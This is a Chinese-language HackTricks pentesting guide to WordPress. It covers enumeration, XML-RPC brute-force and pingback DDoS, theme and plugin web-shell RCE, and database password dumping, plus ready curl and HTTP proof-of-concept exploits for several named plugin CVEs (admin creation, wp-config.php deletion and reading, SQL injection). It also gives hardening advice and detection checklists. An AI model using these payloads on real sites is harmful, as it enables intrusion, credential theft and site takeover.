# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

- **已上传** 的文件会放到: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **主题文件位于 /wp-content/themes/**，所以如果你修改主题的某些 php 来获取 RCE，你很可能会使用该路径。例如：使用 **theme twentytwelve** 可以在: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php) 访问 **404.php** 文件。

- **另一个有用的 url 可能是：** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- 在 **wp-config.php** 中可以找到数据库的 root 密码。
- 默认要检查的登录路径：_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **主要的 WordPress 文件**

- `index.php`
- `license.txt` 包含有用信息，例如安装的 WordPress 版本。
- `wp-activate.php` 用于在设置新 WordPress 站点时的邮件激活流程。
- 登录目录（可能被重命名以隐藏）:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` 是一个文件，表示 WordPress 的一个功能，允许通过 HTTP 作为传输机制、XML 作为编码机制来传输数据。这种通信方式已被 WordPress 的 [REST API](https://developer.wordpress.org/rest-api/reference) 所取代。
- `wp-content` 文件夹是存放插件和主题的主要目录。
- `wp-content/uploads/` 是平台上上传文件存放的目录。
- `wp-includes/` 是存放核心文件的目录，例如证书、字体、JavaScript 文件和小部件。
- `wp-sitemap.xml` 在 WordPress 5.5 及更高版本中，WordPress 会生成一个 sitemap XML 文件，包含所有公开文章以及可公开查询的 post types 和 taxonomies。

**Post exploitation**

- `wp-config.php` 文件包含 WordPress 连接数据库所需的信息，例如数据库名、数据库主机、用户名和密码、认证密钥和盐值，以及数据库表前缀。该配置文件也可以用于启用 DEBUG 模式，这在故障排查时很有用。

### 用户权限

- **Administrator**
- **Editor**：发布并管理自己的和他人的文章
- **Author**：发布并管理自己的文章
- **Contributor**：撰写并管理自己的文章但不能发布
- **Subscriber**：浏览文章并编辑个人资料

## **被动枚举**

### **获取 WordPress 版本**

检查是否能找到文件 `/license.txt` 或 `/readme.html`

在页面的 **源代码** 中（示例来自 [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)）:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS 链接文件

![](<../../images/image (533).png>)

- JavaScript 文件

![](<../../images/image (524).png>)

### 获取插件
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 获取主题
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 通用提取版本
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## 主动枚举

### Plugins and Themes

你可能无法找到所有可用的 Plugins and Themes。为了发现它们，你需要 **主动地 Brute Force 一份 Plugins and Themes 列表**（希望我们有包含这些列表的自动化工具）。

### 用户

- **ID Brute:** 你可以通过 Brute Forcing 用户 ID 从 WordPress 站点获取有效用户：
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
如果响应是 **200** 或 **30X**，这意味着该 id 是 **有效**。如果响应是 **400**，则该 id 是 **无效**。

- **wp-json:** 你也可以尝试通过查询获取用户信息：
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
另一个能暴露一些用户信息的 `/wp-json/` 端点是：
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **只会提供启用此功能的用户的信息**。

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: 在通过 **`/wp-login.php`** 登录时，显示的 **message** 会不同，可用于判断 **username 是否存在**。

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (你可以自动化这个过程[ using this](https://github.com/relarizky/wpxploit) 例如).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**检查**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** 是一些可用于 brute-force credentials 的方法。如果你能找到其中任何一个，你可以发送类似下面的请求：
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
当凭证无效时，200 状态码响应中应出现消息 _"Incorrect username or password"_。

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

使用正确的凭证可以上传文件。在响应中会出现路径 ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
另外有一种更快的方法可以使用 **`system.multicall`** 对凭证进行 brute-force，因为你可以在同一个请求中尝试多个 creds：

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**绕过 2FA**

此方法面向程序而非人类，且较为老旧，因此不支持 2FA。所以，如果你有有效的 creds 但主入口受 2FA 保护，**你可能能够滥用 xmlrpc.php 使用这些 creds 登录，从而绕过 2FA**。注意，你无法执行通过控制台可以完成的所有操作，但你仍可能像 Ippsec 在 [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) 中解释的那样获得 RCE。

**DDoS 或 port scanning**

如果你能在方法列表中找到 _**pingback.ping**_，你就可以让 Wordpress 向任意主机/端口发送任意请求。\
这可用于让 **thousands** 的 Wordpress **sites** 访问同一个 **location**（从而在该位置造成 **DDoS**），或者你可以用它让 **Wordpress** 去 **scan** 一些内部 **network**（你可以指定任意端口）。
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

如果你得到 **faultCode** 的值**大于** **0**（17），那意味着端口是开放的。

查看上一节中 **`system.multicall`** 的用法，了解如何滥用此方法导致 DDoS。

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

此文件通常位于 Wordpress 站点的根目录： **`/wp-cron.php`**\
当此文件被**访问**时，会执行一个**繁重的** MySQL **查询**，因此可能被**攻击者**用来**造成** **DoS**。\
另外，默认情况下，`wp-cron.php` 会在每次页面加载时被调用（任何客户端请求任何 Wordpress 页面时），在高流量站点上可能导致问题（DoS）。

It is recommended to disable Wp-Cron and create a real cronjob inside the host that perform the needed actions in a regular interval (without causing issues).

### /wp-json/oembed/1.0/proxy - SSRF

尝试访问 _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_，Worpress 站点可能会向你发起请求。

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

该工具检查是否存在 **methodName: pingback.ping** 以及路径 **/wp-json/oembed/1.0/proxy**，如果存在，则尝试利用它们。

## 自动化工具
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## 通过覆盖一位获得访问

这与其说是一次真正的攻击，不如说是一种好奇心驱动的实验。 在 CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) 中，你可以翻转任意 wordpress 文件中的 1 位。因此你可以将文件 `/var/www/html/wp-includes/user.php` 中位置为 `5389` 的位翻转为 NOP，从而使 NOT (`!`) 操作失效。
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **面板 RCE**

**修改所用主题中的 php（需要管理员凭据）**

外观 → 主题编辑器 → 404 模板（在右侧）

将内容更改为 php shell：

![](<../../images/image (384).png>)

在网上搜索如何访问该已更新的页面。在本例中，您需要访问： [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

你可以使用：
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## 插件 RCE

### PHP 插件

可能可以将 .php 文件作为插件上传。\
使用例如下面的方法创建你的 PHP 后门：

![](<../../images/image (183).png>)

然后添加一个新插件：

![](<../../images/image (722).png>)

上传插件并按 Install Now：

![](<../../images/image (249).png>)

点击 Procced：

![](<../../images/image (70).png>)

这看起来可能不会有什么反应，但如果你去 Media，你会看到你的 shell 已上传：

![](<../../images/image (462).png>)

访问它，你会看到用于执行 reverse shell 的 URL：

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

该方法涉及安装已知存在漏洞且可被利用以获取 web shell 的恶意插件。该过程通过 WordPress 控制面板执行，步骤如下：

1. **插件获取**：从像 Exploit DB 这样的来源获取插件，例如 [**here**](https://www.exploit-db.com/exploits/36374).
2. **插件安装**：
- 在 WordPress 控制面板中，转到 `Dashboard > Plugins > Upload Plugin`。
- 上传下载的插件的 zip 文件。
3. **插件激活**：插件成功安装后，必须通过控制面板将其激活。
4. **利用**：
- 当安装并激活了名为 "reflex-gallery" 的插件后，可对其进行利用，因为它已知存在漏洞。
- Metasploit framework 提供了针对该漏洞的 exploit。通过加载相应模块并执行特定命令，可以建立 meterpreter 会话，从而获得对该站点的未授权访问。
- 注意，这只是利用 WordPress 站点的众多方法之一。

内容包含展示在 WordPress 控制面板中安装并激活插件步骤的图示。不过需要注意的是，在没有适当授权的情况下以这种方式利用漏洞是非法且不道德的。此信息应负责任地使用，仅在合法背景下，例如在获得明确许可的渗透测试中使用。

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## 从 XSS 到 RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ 是一个脚本，旨在将 **Cross-Site Scripting (XSS)** 漏洞升级为 **Remote Code Execution (RCE)** 或其它 WordPress 的严重漏洞。更多信息请查看 [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)。它为 Wordpress 版本 6.X.X、5.X.X 和 4.X.X 提供支持，并允许：
- _**Privilege Escalation:**_ 在 WordPress 中创建用户。
- _**(RCE) Custom Plugin (backdoor) Upload:**_ 将你的自定义插件（backdoor）上传到 WordPress。
- _**(RCE) Built-In Plugin Edit:**_ 在 WordPress 中编辑内置插件。
- _**(RCE) Built-In Theme Edit:**_ 在 WordPress 中编辑内置主题。
- _**(Custom) Custom Exploits:**_ 为第三方 WordPress 插件/主题提供自定义 exploits。

## 后利用

提取用户名和密码：
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
更改 admin 密码:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

了解 Wordpress 插件如何暴露功能对于发现其功能性漏洞至关重要。下面的要点列出了插件可能暴露功能的方式，示例易受影响的插件可见 [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)。

- **`wp_ajax`**

插件将功能暴露给用户的方式之一是通过 AJAX handlers。这些处理程序可能包含逻辑、授权或认证漏洞。此外，这类函数常常基于 Wordpress nonce 的存在来判断认证和授权，而 **任何在 Wordpress 实例中已认证的用户都可能拥有该 nonce**（与其角色无关）。

以下是可用于在插件中暴露函数的函数：
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**使用 `nopriv` 会使该端点对任何用户可访问（甚至未认证的用户）。**

> [!CAUTION]
> 此外，如果函数只是使用 `wp_verify_nonce` 来检查用户授权，`wp_verify_nonce` 仅检查用户是否已登录，通常不会检查用户的角色。因此低权限用户可能可以访问高权限操作。

- **REST API**

也可以通过使用 `register_rest_route` 函数在 wordpress 中注册 REST API 来暴露函数：
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` 是一个回调函数，用于检查给定用户是否被授权调用该 API 方法。

**如果使用内置的 `__return_true` 函数，它会直接跳过用户权限检查。**

- **直接访问 PHP 文件**

当然，Wordpress 使用 PHP，插件中的文件可以直接通过 web 访问。因此，如果某个插件暴露了仅通过访问文件即可触发的易受攻击功能，任何用户都能够利用它。

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

一些插件为内部集成或 reverse proxies 实现了“trusted header”快捷方式，然后使用该 header 为 REST 请求设置当前用户上下文。如果该 header 未被上游组件以密码学方式绑定到请求，攻击者可以伪造它，从而以管理员身份访问有特权的 REST 路由。

- Impact: 未经身份验证的权限提升为管理员，通过核心 users REST 路由创建新的管理员。
- Example header: `X-Wcpay-Platform-Checkout-User: 1`（强制用户 ID 为 1，通常是第一个管理员账号）。
- Exploited route: `POST /wp-json/wp/v2/users`，包含提升角色的数组。

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
为什么可行

- 插件将客户端可控的 header 映射到认证状态并跳过能力检查。
- WordPress core 期望此路由需要 `create_users` 能力；该插件通过直接从 header 设置当前用户上下文来绕过该检查。

预期成功指示

- 返回 HTTP 201，且 JSON 正文描述已创建的用户。
- 在 `wp-admin/users.php` 中可见一个新的 admin 用户。

检测清单

- Grep 查找 `getallheaders()`、`$_SERVER['HTTP_...']`，或会读取自定义 header 来设置用户上下文的 vendor SDK（例如 `wp_set_current_user()`、`wp_set_auth_cookie()`）。
- 审查 REST 注册，查找那些缺乏健壮 `permission_callback` 检查且依赖请求 header 的特权回调。
- 查找在仅由 header 值控制的 REST 处理程序内部使用核心用户管理函数（`wp_insert_user`、`wp_create_user`）的情况。

加固建议

- 切勿从客户端可控的 header 推导认证或授权。
- 如果必须由反向代理注入身份，应在代理处终止信任并剥离入站副本（例如在边缘处 `unset X-Wcpay-Platform-Checkout-User`），然后传递签名令牌并在服务器端验证它。
- 对于执行特权操作的 REST 路由，要求使用 `current_user_can()` 检查并实现严格的 `permission_callback`（不要使用 `__return_true`）。
- 优先使用第一方认证（cookies、application passwords、OAuth），而不是 header “模拟”。

参考：参见本页末尾的链接，了解一个公开案例和更广泛的分析。

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress 主题和插件经常通过 `wp_ajax_` 和 `wp_ajax_nopriv_` 钩子暴露 AJAX 处理程序。当使用 **_nopriv_** 变体时，**回调会被未认证的访问者访问到**，因此任何敏感操作还必须额外实现：

1. 一个 **能力检查**（例如 `current_user_can()` 或至少 `is_user_logged_in()`），以及
2. 一个通过 `check_ajax_referer()` / `wp_verify_nonce()` 验证的 **CSRF nonce**，以及
3. **严格的输入净化/验证**。

Litho 多用途主题（< 3.1）在 *Remove Font Family* 功能中忘记了这三项控制，最终随主题发布了如下代码（已简化）：
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
该代码片段引入的问题：

* **Unauthenticated access** – the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** – any visitor can hit the endpoint.
* **No path sanitisation** – the user–controlled `fontfamily` string is concatenated to a filesystem path without filtering, allowing classic `../../` traversal.

#### 利用

攻击者可以通过发送单个 HTTP POST 请求删除位于 **uploads 基目录以下**（通常为 `<wp-root>/wp-content/uploads/`）的任意文件或目录：
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### 检测清单

* 任何调用文件系统辅助函数（`copy()`, `unlink()`, `$wp_filesystem->delete()` 等）的 `add_action( 'wp_ajax_nopriv_...')` 回调。
* 未经消毒的用户输入被拼接到路径中（查找 `$_POST`, `$_GET`, `$_REQUEST`）。
* 缺少 `check_ajax_referer()` 和 `current_user_can()`/`is_user_logged_in()`。

#### 加固
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **始终** 将任何对磁盘的写入/删除操作视为有权限风险，并进行双重检查：
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

许多插件通过将原始角色保存在 user meta 中来实现“view as role”或临时角色切换功能，以便稍后恢复。如果还原流程仅依赖请求参数（例如 `$_REQUEST['reset-for']`）和插件维护的列表，而未在移除当前角色并重新添加来自用户 meta 的保存角色之前检查 capabilities 和有效 nonce，则会导致 vertical privilege escalation。

在 Admin and Site Enhancements (ASE) 插件（≤ 7.6.2.1）中发现了一个真实示例。重置分支基于 `reset-for=<username>` 恢复角色——如果该用户名出现在内部数组 `$options['viewing_admin_as_role_are']` 中——但在移除当前角色并重新添加来自用户 meta `_asenha_view_admin_as_original_roles` 的保存角色之前，既没有进行 `current_user_can()` 检查，也没有进行 nonce 验证：
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
为何可被利用

- 信任 `$_REQUEST['reset-for']` 和一个插件选项，而没有进行服务器端授权。
- 如果某用户之前在 `_asenha_view_admin_as_original_roles` 中保存了更高的权限并被降级，他们可以通过访问重置路径来恢复这些权限。
- 在某些部署中，任何已认证用户都可以触发针对仍保存在 `viewing_admin_as_role_are` 中的其他用户名的重置（授权失效）。

攻击先决条件

- 启用了该功能的易受攻击的插件版本。
- 目标账户在用户 meta 中保留了先前使用留下的过期高权限角色。
- 任何已认证的会话；重置流程中缺少 nonce/capability。

利用（示例）
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
在易受攻击的构建上，这会移除当前角色并重新添加保存的原始角色（例如 `administrator`），从而有效提升权限。

Detection checklist

- 查找会在 user meta 中持久化“原始角色”的 role-switching 功能（例如 `_asenha_view_admin_as_original_roles`）。
- 识别重置/恢复路径，这些路径会：
  - 从 `$_REQUEST` / `$_GET` / `$_POST` 读取用户名。
  - 通过 `add_role()` / `remove_role()` 修改角色，但未使用 `current_user_can()` 和 `wp_verify_nonce()` / `check_admin_referer()`。
  - 基于插件选项数组（例如 `viewing_admin_as_role_are`）进行授权，而不是基于执行者的权限。

Hardening

- 在所有会改变状态的分支上强制执行权限检查（例如 `current_user_can('manage_options')` 或更严格的检查）。
- 所有角色/权限更改都必须使用 nonce 并进行验证：`check_admin_referer()` / `wp_verify_nonce()`。
- 绝不信任请求中提供的用户名；应基于已认证的执行者和明确策略在服务器端解析目标用户。
- 在配置档/角色更新时使“原始角色”状态失效，以避免陈旧的高权限恢复：
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- 考虑尽量少存储状态，并为临时角色切换使用时限性、capability-guarded tokens。

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

一些插件将 user-switching helpers 绑定到公共的 `init` hook，并从客户端可控的 cookie 派生身份。如果代码在未验证 authentication、capability 和有效 nonce 的情况下调用 `wp_set_auth_cookie()`，任何 unauthenticated 访客都可以强制以任意用户 ID 登录。

典型的易受攻击模式（简化自 Service Finder Bookings ≤ 6.1）：
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
为什么可被利用

- 公开的 `init` hook 使该处理程序对未认证用户可达（没有 `is_user_logged_in()` 检查）。
- 身份来源于客户端可修改的 cookie（`original_user_id`）。
- 直接调用 `wp_set_auth_cookie($uid)` 会在没有任何 capability/nonce 检查的情况下将请求者以该用户身份登录。

利用（未认证）
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many high‑impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

进攻注意事项

- 针对插件特定端点使用干净的 payload：`admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- 先尝试未认证路径（AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes）。默认 payload 常常在不混淆的情况下就能成功。
- 典型高影响场景：privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

防御注意事项

- 不要依赖通用 WAF 签名来保护插件 CVEs。应在应用层实施针对漏洞的虚拟补丁，或尽快更新。
- 在代码中优先使用正向安全检查（capabilities, nonces, strict input validation）而不是基于负向的 regex 过滤。

## WordPress Protection

### Regular Updates

确保 WordPress、plugins 和 themes 是最新的。还要确认在 wp-config.php 中启用了自动更新：
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
此外，**仅安装可信赖的 WordPress 插件和主题**。

### 安全插件

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **其他建议**

- 移除默认的 **admin** 用户
- 使用 **强密码** 和 **2FA**
- 定期 **审核** 用户 **权限**
- **限制登录尝试次数** 以防止 Brute Force 攻击
- 重命名 **`wp-admin.php`** 文件，并仅允许内部或特定 IP 地址访问。


### 未认证的 SQL Injection（由于验证不足）（WP Job Portal <= 2.3.2）

WP Job Portal 招聘插件暴露了一个 savecategory 任务，该任务最终在 `modules/category/model.php::validateFormData()` 中执行以下易受攻击的代码：
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** – `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** – no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### 利用

1. 获取一个新的 nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. 通过滥用 `parentid` 注入任意 SQL:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
响应会披露注入查询的结果或更改数据库，从而证明 SQLi。


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

另一个任务，**downloadcustomfile**，允许访问者通过 path traversal 下载磁盘上的 **任意文件**。易受攻击的 sink 位于 `modules/customfield/model.php::downloadCustomUploadedFile()`：
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` 由攻击者控制并在 **without sanitisation** 的情况下被拼接。再次，唯一的门槛是可以从 resume 页面获取的 **CSRF nonce**。

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
服务器响应并返回 `wp-config.php` 的内容，leaking DB credentials and auth keys。

## 参考资料

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
